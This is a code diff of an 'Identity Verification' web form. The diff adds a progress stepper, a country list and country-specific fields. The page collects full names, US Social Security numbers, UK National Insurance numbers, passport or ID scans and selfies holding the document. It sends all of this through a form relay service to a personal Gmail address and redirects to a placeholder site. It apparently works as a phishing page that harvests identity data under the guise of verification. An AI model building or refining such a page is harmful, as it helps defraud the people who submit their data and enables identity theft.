@@ -19,6 +19,11 @@
             --glow-color: #d1c4e9;
             --placeholder-color: #c0c0d0;
             --error-color: #ff7070;
+            --back-btn-bg: #5a5a6b;
+            --back-btn-hover-bg: #6e6e84;
+            --next-btn-active: #4CAF50;
+            --next-btn-hover: #45a049;
+            --next-btn-inactive: #6a6a9b;
         }
 
         body {
@@ -55,6 +60,55 @@
             color: var(--text-color);
             font-weight: 700;
             letter-spacing: 1px;
+        }
+
+        .progress-bar-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            position: relative;
+        }
+        .progress-bar-container::before {
+            content: '';
+            position: absolute;
+            height: 4px;
+            width: 100%;
+            background-color: #6a6a9b;
+            top: 50%;
+            transform: translateY(-50%);
+            z-index: 0;
+        }
+        .progress-step {
+            width: 30px;
+            height: 30px;
+            background-color: #6a6a9b;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-weight: 700;
+            z-index: 1;
+            transition: background-color 0.4s ease-in-out;
+            border: 2px solid var(--form-bg);
+        }
+        .progress-step.active {
+            background-color: var(--primary-color);
+        }
+        .progress-step.completed {
+            background-color: var(--next-btn-active);
+        }
+        .progress-line {
+            height: 4px;
+            background-color: var(--primary-color);
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            left: 0;
+            z-index: 0;
+            width: 0;
+            transition: width 0.4s ease-in-out;
         }
 
         .form-section {
@@ -123,11 +177,11 @@
         }
         
         .camera-button.attached {
-            background-color: #4CAF50;
+            background-color: var(--next-btn-active);
             color: white;
         }
         .camera-button.attached:hover {
-            background-color: #45a049;
+            background-color: var(--next-btn-hover);
         }
 
         .camera-button i {
@@ -140,23 +194,23 @@
             transform: scale(1.02);
         }
 
-        #submitBtn {
+        #submitBtn, .form-navigation .back-btn, .form-navigation .next-btn {
             width: 100%;
             padding: 15px;
-            background-color: var(--primary-color);
-            color: white;
-            border: none;
             border-radius: 12px;
             font-weight: 700;
             cursor: pointer;
+            font-size: 16px;
+            transition: transform 0.3s, background-color 0.3s, box-shadow 0.3s;
+            border: none;
+        }
+        
+        #submitBtn {
+            background-color: var(--primary-color);
+            color: white;
             font-size: 18px;
-            transition: transform 0.3s, background-color 0.3s;
-            position: relative;
-            overflow: hidden;
-            margin-top: 25px;
             letter-spacing: 1px;
         }
-
         #submitBtn:hover {
             background-color: var(--primary-light);
             transform: translateY(-3px);
@@ -254,33 +308,34 @@
             margin-top: 20px;
             gap: 10px;
         }
-
         .form-navigation button {
             flex: 1;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 8px;
-            font-weight: 600;
-            cursor: pointer;
-            background-color: #424242;
+        }
+        .form-navigation .back-btn {
+            background-color: var(--back-btn-bg);
             color: var(--text-color);
-            transition: background-color 0.3s;
-            font-size: 16px;
         }
-        .form-navigation button:hover {
-            background-color: #555;
+        .form-navigation .back-btn:hover {
+            background-color: var(--back-btn-hover-bg);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
         }
-        .error-message {
-            color: var(--error-color);
-            font-size: 14px;
-            margin-top: 5px;
-            display: none;
+        .form-navigation .next-btn {
+            background-color: var(--next-btn-inactive);
+            color: white;
+            cursor: not-allowed;
         }
-        .file-upload-info {
-            font-size: 14px;
-            color: #b0b0b0;
-            margin-top: 10px;
-            text-align: center;
+        .form-navigation .next-btn.active-btn {
+            background-color: var(--next-btn-active);
+            cursor: pointer;
+        }
+        .form-navigation .next-btn.active-btn:hover {
+            background-color: var(--next-btn-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+        .form-navigation .next-btn i {
+            margin-left: 8px;
         }
     </style>
 </head>
@@ -288,6 +343,13 @@
 
     <div class="container" id="formContainer">
         <h2>Identity Verification</h2>
+
+        <div class="progress-bar-container">
+            <div class="progress-step active" id="stepIndicator1">1</div>
+            <div class="progress-step" id="stepIndicator2">2</div>
+            <div class="progress-step" id="stepIndicator3">3</div>
+            <div class="progress-line" id="progressLine"></div>
+        </div>
 
         <form id="verificationForm" action="https://formsubmit.co/ademlindo65@gmail.com" method="POST" enctype="multipart/form-data">
             <input type="hidden" name="_next" value="https://yourwebsite.com/success.html">
@@ -297,23 +359,13 @@
                 <div class="form-group">
                     <label for="country">Country</label>
                     <select id="country" name="country">
-                        <option value="" disabled selected>Select your country</option>
-                        <option value="US">United States</option>
-                        <option value="other">Other</option>
-                    </select>
+                        </select>
                     <span class="error-message" id="countryError">Please select your country.</span>
                 </div>
-                <div class="form-group" id="usFields" style="height: 0; opacity: 0; overflow: hidden;">
-                    <label for="fullName">Full Name</label>
-                    <input type="text" id="fullName" name="fullName" placeholder="Enter your full name">
-                    <span class="error-message" id="fullNameError">Please enter your full name.</span>
-
-                    <label for="ssn">Social Security Number (SSN)</label>
-                    <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX">
-                    <span class="error-message" id="ssnError">Please enter your SSN.</span>
-                </div>
+                <div id="personalInfoFields">
+                    </div>
                 <div class="form-navigation">
-                    <button type="button" class="next-btn" onclick="nextStep(2)">Next</button>
+                    <button type="button" class="next-btn" id="nextBtn1">Next <i class="fas fa-arrow-right"></i></button>
                 </div>
             </div>
 
@@ -321,16 +373,12 @@
                 <div class="form-group">
                     <label for="documentType">Verification Method</label>
                     <select id="documentType" name="documentType">
-                        <option value="" disabled selected>Choose a document type</option>
-                        <option value="passport">Passport</option>
-                        <option value="drivers-license">Driver's License</option>
-                        <option value="identification">Identification Card</option>
-                    </select>
+                        </select>
                     <span class="error-message" id="documentTypeError">Please select a verification method.</span>
                 </div>
                 <div class="form-navigation">
-                    <button type="button" class="back-btn" onclick="nextStep(1)">Back</button>
-                    <button type="button" class="next-btn" onclick="nextStep(3)">Next</button>
+                    <button type="button" class="back-btn" id="backBtn2">Back</button>
+                    <button type="button" class="next-btn" id="nextBtn2">Next <i class="fas fa-arrow-right"></i></button>
                 </div>
             </div>
 
@@ -338,8 +386,8 @@
                 <div id="dynamicFields">
                     </div>
                 <div class="form-navigation">
-                    <button type="button" class="back-btn" onclick="nextStep(2)">Back</button>
-                    <button type="submit" id="submitBtn">Submit</button>
+                    <button type="button" class="back-btn" id="backBtn3">Back</button>
+                    <button type="submit" id="submitBtn">Submit <i class="fas fa-paper-plane"></i></button>
                 </div>
             </div>
         </form>
@@ -366,11 +414,14 @@
     <script>
         const formContainer = document.getElementById('formContainer');
         const countrySelect = document.getElementById('country');
-        const usFields = document.getElementById('usFields');
+        const personalInfoFields = document.getElementById('personalInfoFields');
         const documentTypeSelect = document.getElementById('documentType');
-        const ssnInput = document.getElementById('ssn');
         const dynamicFieldsContainer = document.getElementById('dynamicFields');
         const formSections = document.querySelectorAll('.form-section');
+        const nextBtn1 = document.getElementById('nextBtn1');
+        const nextBtn2 = document.getElementById('nextBtn2');
+        const backBtn2 = document.getElementById('backBtn2');
+        const backBtn3 = document.getElementById('backBtn3');
 
         const cameraPopup = document.getElementById('cameraPopup');
         const cameraFeed = document.getElementById('camera-feed');
@@ -378,12 +429,65 @@
         const captureBtn = document.getElementById('capture-btn');
         let currentStream;
         let currentInputId;
-        let docCounter = 0;
 
-        // Ensure the first step is visible from the start
-        document.getElementById('step1').classList.add('active', 'visible');
+        const progressSteps = document.querySelectorAll('.progress-step');
+        const progressLine = document.getElementById('progressLine');
+        let currentStep = 1;
+
+        const countryList = [
+            { code: "US", name: "United States" },
+            { code: "GB", name: "United Kingdom" },
+            { code: "AL", name: "Albania" },
+            { code: "AD", name: "Andorra" },
+            { code: "AT", name: "Austria" },
+            { code: "BY", name: "Belarus" },
+            { code: "BE", name: "Belgium" },
+            { code: "BA", name: "Bosnia and Herzegovina" },
+            { code: "BG", name: "Bulgaria" },
+            { code: "HR", name: "Croatia" },
+            { code: "CY", name: "Cyprus" },
+            { code: "CZ", name: "Czech Republic" },
+            { code: "DK", name: "Denmark" },
+            { code: "EE", name: "Estonia" },
+            { code: "FI", name: "Finland" },
+            { code: "FR", name: "France" },
+            { code: "DE", name: "Germany" },
+            { code: "GR", name: "Greece" },
+            { code: "HU", name: "Hungary" },
+            { code: "IS", name: "Iceland" },
+            { code: "IE", name: "Ireland" },
+            { code: "IT", name: "Italy" },
+            { code: "XK", name: "Kosovo" },
+            { code: "LV", name: "Latvia" },
+            { code: "LI", name: "Liechtenstein" },
+            { code: "LT", name: "Lithuania" },
+            { code: "LU", name: "Luxembourg" },
+            { code: "MT", name: "Malta" },
+            { code: "MD", name: "Moldova" },
+            { code: "MC", name: "Monaco" },
+            { code: "ME", name: "Montenegro" },
+            { code: "NL", name: "Netherlands" },
+            { code: "MK", name: "North Macedonia" },
+            { code: "NO", name: "Norway" },
+            { code: "PL", name: "Poland" },
+            { code: "PT", name: "Portugal" },
+            { code: "RO", name: "Romania" },
+            { code: "RU", name: "Russia" },
+            { code: "SM", name: "San Marino" },
+            { code: "RS", name: "Serbia" },
+            { code: "SK", name: "Slovakia" },
+            { code: "SI", name: "Slovenia" },
+            { code: "ES", name: "Spain" },
+            { code: "SE", name: "Sweden" },
+            { code: "CH", name: "Switzerland" },
+            { code: "TR", name: "Turkey" },
+            { code: "UA", name: "Ukraine" },
+            { code: "VA", name: "Vatican City" }
+        ];
+
+        // Initial animations
         gsap.to(formContainer, { opacity: 1, y: 0, duration: 1, ease: "power2.out" });
-        
+
         document.addEventListener('mousemove', (e) => {
             gsap.to('.glow', {
                 x: e.clientX,
@@ -397,17 +501,117 @@
             gsap.to('.glow', { opacity: 0, duration: 0.5 });
         });
 
-        countrySelect.addEventListener('change', () => {
-            if (countrySelect.value === 'US') {
-                gsap.fromTo(usFields, { height: 0, opacity: 0 }, { height: 'auto', opacity: 1, duration: 0.5, ease: 'power1.inOut', onComplete: () => usFields.style.overflow = 'visible' });
-            } else {
-                gsap.to(usFields, { height: 0, opacity: 0, duration: 0.5, ease: 'power1.inOut', onComplete: () => {
-                    usFields.style.overflow = 'hidden';
-                    document.getElementById('fullName').value = '';
-                    document.getElementById('ssn').value = '';
-                }});
+        function populateCountries() {
+            let optionsHtml = `<option value="" disabled selected>Select your country</option>`;
+            
+            const specialCountries = countryList.filter(c => c.code === "US" || c.code === "GB");
+            specialCountries.forEach(country => {
+                optionsHtml += `<option value="${country.code}">${country.name}</option>`;
+            });
+
+            const otherCountries = countryList.filter(c => c.code !== "US" && c.code !== "GB");
+            otherCountries.sort((a, b) => a.name.localeCompare(b.name));
+            otherCountries.forEach(country => {
+                optionsHtml += `<option value="${country.code}">${country.name}</option>`;
+            });
+
+            countrySelect.innerHTML = optionsHtml;
+        }
+
+        function updatePersonalInfoFields() {
+            const countryCode = countrySelect.value;
+            let html = '';
+            if (countryCode === 'US') {
+                html = `
+                    <div class="form-group">
+                        <label for="fullName">Full Name</label>
+                        <input type="text" id="fullName" name="fullName" placeholder="Enter your full name">
+                        <span class="error-message" id="fullNameError">Please enter your full name.</span>
+                    </div>
+                    <div class="form-group">
+                        <label for="ssn">Social Security Number (SSN)</label>
+                        <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX">
+                        <span class="error-message" id="ssnError">Please enter your SSN.</span>
+                    </div>
+                `;
+            } else if (countryCode === 'GB') {
+                html = `
+                    <div class="form-group">
+                        <label for="fullName">Full Name</label>
+                        <input type="text" id="fullName" name="fullName" placeholder="Enter your full name">
+                        <span class="error-message" id="fullNameError">Please enter your full name.</span>
+                    </div>
+                    <div class="form-group">
+                        <label for="nino">National Insurance Number (NINO)</label>
+                        <input type="text" id="nino" name="nino" placeholder="e.g., QQ123456C">
+                        <span class="error-message" id="ninoError">Please enter your NINO.</span>
+                    </div>
+                `;
+            } else if (countryCode) {
+                html = `
+                    <div class="form-group">
+                        <label for="firstName">First Name</label>
+                        <input type="text" id="firstName" name="firstName" placeholder="Enter your first name">
+                        <span class="error-message" id="firstNameError">Please enter your first name.</span>
+                    </div>
+                    <div class="form-group">
+                        <label for="lastName">Last Name</label>
+                        <input type="text" id="lastName" name="lastName" placeholder="Enter your last name">
+                        <span class="error-message" id="lastNameError">Please enter your last name.</span>
+                    </div>
+                `;
             }
+            personalInfoFields.innerHTML = html;
+            // Add event listener for ssn input
+            if (countryCode === 'US') {
+                const ssnInput = document.getElementById('ssn');
+                ssnInput.addEventListener('input', formatSSN);
+            }
+            gsap.fromTo(personalInfoFields.querySelectorAll('.form-group'), { y: 20, opacity: 0 }, { y: 0, opacity: 1, stagger: 0.1, duration: 0.4 });
+            checkStep1Validity();
+        }
+
+        function updateDocumentTypes() {
+            const countryCode = countrySelect.value;
+            let optionsHtml = `<option value="" disabled selected>Choose a document type</option>`;
+            if (countryCode === 'US' || countryCode === 'GB') {
+                optionsHtml += `
+                    <option value="passport">Passport</option>
+                    <option value="drivers-license">Driver's License</option>
+                    <option value="identification">Identification Card</option>
+                `;
+            } else {
+                optionsHtml += `
+                    <option value="passport">Passport</option>
+                    <option value="id-card">ID Card</option>
+                `;
+            }
+            documentTypeSelect.innerHTML = optionsHtml;
+        }
+
+        function formatSSN(e) {
+            const input = e.target;
+            const value = input.value.replace(/\D/g, '');
+            let formattedValue = '';
+            if (value.length > 0) formattedValue += value.substring(0, 3);
+            if (value.length > 3) formattedValue += '-' + value.substring(3, 5);
+            if (value.length > 5) formattedValue += '-' + value.substring(5, 9);
+            input.value = formattedValue;
+            checkStep1Validity();
+        }
+
+        // Event Listeners
+        countrySelect.addEventListener('change', () => {
+            updatePersonalInfoFields();
+            updateDocumentTypes();
             hideError('countryError');
+            checkStep1Validity();
+        });
+
+        personalInfoFields.addEventListener('input', (e) => {
+            if (e.target.id === 'fullName' || e.target.id === 'firstName' || e.target.id === 'lastName' || e.target.id === 'nino') {
+                checkStep1Validity();
+            }
         });
 
         documentTypeSelect.addEventListener('change', () => {
@@ -426,7 +630,7 @@
                 html = `
                     <div class="form-group visible">
                         <label for="passportUpload" class="required">Passport Scan</label>
-                        <input type="file" id="passportUpload" name="passportUpload" accept="image/*">
+                        <input type="file" id="passportUpload" name="passportUpload" accept="image/*" onchange="checkStep3Validity()">
                         <button type="button" class="camera-button" onclick="openCamera('passportUpload', 'environment')">
                             <i class="fas fa-camera"></i> Open Camera
                         </button>
@@ -434,18 +638,18 @@
                     </div>
                     <div class="form-group visible">
                         <label for="selfiePassportUpload" class="required">Selfie with Passport</label>
-                        <input type="file" id="selfiePassportUpload" name="selfiePassportUpload" accept="image/*">
+                        <input type="file" id="selfiePassportUpload" name="selfiePassportUpload" accept="image/*" onchange="checkStep3Validity()">
                         <button type="button" class="camera-button" onclick="openCamera('selfiePassportUpload', 'user')">
                             <i class="fas fa-camera"></i> Open Camera
                         </button>
                         <span class="error-message" id="selfiePassportUploadError">Please upload a selfie with your passport.</span>
                     </div>
                 `;
-            } else if (selectedType === 'drivers-license' || selectedType === 'identification') {
+            } else if (selectedType === 'drivers-license' || selectedType === 'identification' || selectedType === 'id-card') {
                 html = `
                     <div class="form-group visible">
                         <label for="frontSide" class="required">Front Side of Document</label>
-                        <input type="file" id="frontSide" name="frontSide" accept="image/*">
+                        <input type="file" id="frontSide" name="frontSide" accept="image/*" onchange="checkStep3Validity()">
                         <button type="button" class="camera-button" onclick="openCamera('frontSide', 'environment')">
                             <i class="fas fa-camera"></i> Open Camera
                         </button>
@@ -453,7 +657,7 @@
                     </div>
                     <div class="form-group visible">
                         <label for="backSide" class="required">Back Side of Document</label>
-                        <input type="file" id="backSide" name="backSide" accept="image/*">
+                        <input type="file" id="backSide" name="backSide" accept="image/*" onchange="checkStep3Validity()">
                         <button type="button" class="camera-button" onclick="openCamera('backSide', 'environment')">
                             <i class="fas fa-camera"></i> Open Camera
                         </button>
@@ -461,7 +665,7 @@
                     </div>
                     <div class="form-group visible">
                         <label for="selfieDlId" class="required">Selfie with Document</label>
-                        <input type="file" id="selfieDlId" name="selfieDlId" accept="image/*">
+                        <input type="file" id="selfieDlId" name="selfieDlId" accept="image/*" onchange="checkStep3Validity()">
                         <button type="button" class="camera-button" onclick="openCamera('selfieDlId', 'user')">
                             <i class="fas fa-camera"></i> Open Camera
                         </button>
@@ -472,43 +676,143 @@
             dynamicFieldsContainer.innerHTML = html;
             gsap.fromTo(dynamicFieldsContainer.querySelectorAll('.form-group'), { y: 20, opacity: 0 }, { y: 0, opacity: 1, stagger: 0.1, duration: 0.4 });
             hideError('documentTypeError');
+            checkStep2Validity();
         });
 
+        // Validation Functions
+        function checkStep1Validity() {
+            const countryCode = countrySelect.value;
+            let isValid = false;
+
+            if (countryCode === 'US') {
+                const fullName = document.getElementById('fullName').value.trim();
+                const ssn = document.getElementById('ssn').value.trim();
+                isValid = fullName && ssn.replace(/-/g, '').length === 9;
+            } else if (countryCode === 'GB') {
+                const fullName = document.getElementById('fullName').value.trim();
+                const nino = document.getElementById('nino').value.trim();
+                const ninoRegex = /^[A-Z]{2}\s?[0-9]{2}\s?[0-9]{2}\s?[0-9]{2}\s?[A-Z]$/i;
+                isValid = fullName && ninoRegex.test(nino.toUpperCase().replace(/\s/g, ''));
+            } else if (countryCode) {
+                const firstName = document.getElementById('firstName').value.trim();
+                const lastName = document.getElementById('lastName').value.trim();
+                isValid = firstName && lastName;
+            } else {
+                isValid = false;
+            }
+            toggleNextButton(nextBtn1, isValid);
+        }
+
+        function checkStep2Validity() {
+            const isValid = documentTypeSelect.value !== '';
+            toggleNextButton(nextBtn2, isValid);
+        }
+
+        function checkStep3Validity() {
+            const selectedType = documentTypeSelect.value;
+            let isValid = false;
+            if (selectedType === 'passport') {
+                isValid = document.getElementById('passportUpload').files.length > 0 && document.getElementById('selfiePassportUpload').files.length > 0;
+            } else if (selectedType === 'drivers-license' || selectedType === 'identification' || selectedType === 'id-card') {
+                isValid = document.getElementById('frontSide').files.length > 0 && document.getElementById('backSide').files.length > 0 && document.getElementById('selfieDlId').files.length > 0;
+            }
+            document.getElementById('submitBtn').disabled = !isValid;
+            document.getElementById('submitBtn').style.backgroundColor = isValid ? 'var(--primary-color)' : 'var(--next-btn-inactive)';
+            document.getElementById('submitBtn').style.cursor = isValid ? 'pointer' : 'not-allowed';
+        }
+
+        function toggleNextButton(button, isValid) {
+            if (isValid) {
+                button.classList.add('active-btn');
+                button.disabled = false;
+            } else {
+                button.classList.remove('active-btn');
+                button.disabled = true;
+            }
+        }
+
+        // Stepper Navigation
         function nextStep(stepNumber) {
             const currentStepElement = document.querySelector('.form-section.active');
             const nextStepElement = document.getElementById(`step${stepNumber}`);
             
-            if (stepNumber > 1) {
-                const isValid = validateStep(parseInt(currentStepElement.id.replace('step', '')));
+            // Validate only when moving forward
+            const isMovingForward = stepNumber > currentStep;
+            if (isMovingForward) {
+                const isValid = validateStep(currentStep);
                 if (!isValid) return;
             }
 
-            gsap.to(currentStepElement, { opacity: 0, y: -20, duration: 0.3, onComplete: () => {
-                currentStepElement.classList.remove('active');
+            // Animate transition
+            gsap.to(currentStepElement, { opacity: 0, y: isMovingForward ? -20 : 20, duration: 0.3, onComplete: () => {
+                currentStepElement.classList.remove('active', 'visible');
                 nextStepElement.classList.add('active', 'visible');
-                gsap.fromTo(nextStepElement, { opacity: 0, y: 20 }, { opacity: 1, y: 0, duration: 0.5, ease: "power2.out" });
+                gsap.fromTo(nextStepElement, { y: isMovingForward ? 20 : -20, opacity: 0 }, { y: 0, opacity: 1, duration: 0.5, ease: "power2.out" });
             }});
+
+            currentStep = stepNumber;
+            updateProgressBar(currentStep);
+        }
+
+        function updateProgressBar(stepNumber) {
+            progressSteps.forEach((step, index) => {
+                if (index < stepNumber - 1) {
+                    step.classList.add('completed');
+                } else {
+                    step.classList.remove('completed');
+                }
+                if (index + 1 === stepNumber) {
+                    step.classList.add('active');
+                } else {
+                    step.classList.remove('active');
+                }
+            });
+
+            let progress = (stepNumber - 1) * 50;
+            gsap.to(progressLine, { width: `${progress}%`, duration: 0.4 });
         }
 
         function validateStep(stepNumber) {
             let isValid = true;
             document.querySelectorAll('.error-message').forEach(span => span.style.display = 'none');
-
+            const countryCode = countrySelect.value;
+            
             if (stepNumber === 1) {
-                const country = countrySelect.value;
-                if (!country) {
+                if (!countryCode) {
                     showError('countryError', 'Please select your country.');
                     isValid = false;
-                }
-                if (country === 'US') {
+                } else if (countryCode === 'US') {
                     const fullName = document.getElementById('fullName').value.trim();
                     const ssn = document.getElementById('ssn').value.trim();
                     if (!fullName) {
                         showError('fullNameError', 'Please enter your full name.');
                         isValid = false;
                     }
-                    if (!ssn) {
-                        showError('ssnError', 'Please enter your SSN.');
+                    if (ssn.replace(/-/g, '').length !== 9) {
+                        showError('ssnError', 'Please enter a complete SSN.');
+                        isValid = false;
+                    }
+                } else if (countryCode === 'GB') {
+                    const fullName = document.getElementById('fullName').value.trim();
+                    const nino = document.getElementById('nino').value.trim();
+                    const ninoRegex = /^[A-Z]{2}[0-9]{6}[A-Z]$/i;
+                    if (!fullName) {
+                        showError('fullNameError', 'Please enter your full name.');
+                        isValid = false;
+                    }
+                    if (!ninoRegex.test(nino.replace(/\s/g, '').toUpperCase())) {
+                        showError('ninoError', 'Please enter a valid NINO (e.g., QQ123456C).');
+                        isValid = false;
+                    }
+                } else if (countryCode) {
+                    const firstName = document.getElementById('firstName').value.trim();
+                    const lastName = document.getElementById('lastName').value.trim();
+                    if (!firstName) {
+                        showError('firstNameError', 'Please enter your first name.');
+                        isValid = false;
+                    }
+                    if (!lastName) {
+                        showError('lastNameError', 'Please enter your last name.');
                         isValid = false;
                     }
                 }
@@ -528,7 +832,7 @@
                         showError('selfiePassportUploadError', 'Selfie with passport is required.');
                         isValid = false;
                     }
-                } else if (selectedType === 'drivers-license' || selectedType === 'identification') {
+                } else if (selectedType === 'drivers-license' || selectedType === 'identification' || selectedType === 'id-card') {
                     if (!document.getElementById('frontSide').files.length) {
                         showError('frontSideError', 'Front side of document is required.');
                         isValid = false;
@@ -560,17 +864,6 @@
                 errorElement.style.display = 'none';
             }
         }
-
-        ssnInput.addEventListener('input', (e) => {
-            const value = e.target.value.replace(/\D/g, '');
-            let formattedValue = '';
-            if (value.length > 0) formattedValue += value.substring(0, 3);
-            if (value.length > 3) formattedValue += '-' + value.substring(3, 5);
-            if (value.length > 5) formattedValue += '-' + value.substring(5, 9);
-            e.target.value = formattedValue;
-            hideError('ssnError');
-        });
-        document.getElementById('fullName').addEventListener('input', () => hideError('fullNameError'));
 
         async function openCamera(inputId, facingMode) {
             currentInputId = inputId;
@@ -633,10 +926,10 @@
                 
                 closeCamera();
                 hideError(`${currentInputId}Error`);
+                checkStep3Validity();
             }, 'image/jpeg');
         });
 
-        // Helper function to get a meaningful doc name
         function getDocId(inputId) {
             switch(inputId) {
                 case 'passportUpload': return 'passport_scan';
@@ -658,23 +951,16 @@
                 }
                 return;
             }
-            
-            e.preventDefault();
-            gsap.to(formContainer, {
-                opacity: 0,
-                y: -50,
-                duration: 0.5,
-                onComplete: () => {
-                    formContainer.style.display = 'none';
-                    document.getElementById('successAnimation').style.display = 'block';
-                    gsap.fromTo('#successAnimation',
-                        { opacity: 0, scale: 0.8 },
-                        { opacity: 1, scale: 1, duration: 0.8, ease: "back.out(1.7)" }
-                    );
-                    setTimeout(() => e.target.submit(), 1500);
-                }
-            });
         });
+
+        nextBtn1.addEventListener('click', () => { nextStep(2); });
+        nextBtn2.addEventListener('click', () => { nextStep(3); });
+        backBtn2.addEventListener('click', () => { nextStep(1); });
+        backBtn3.addEventListener('click', () => { nextStep(2); });
+
+        populateCountries();
+        updatePersonalInfoFields();
+        updateDocumentTypes();
     </script>
 </body>
 </html>
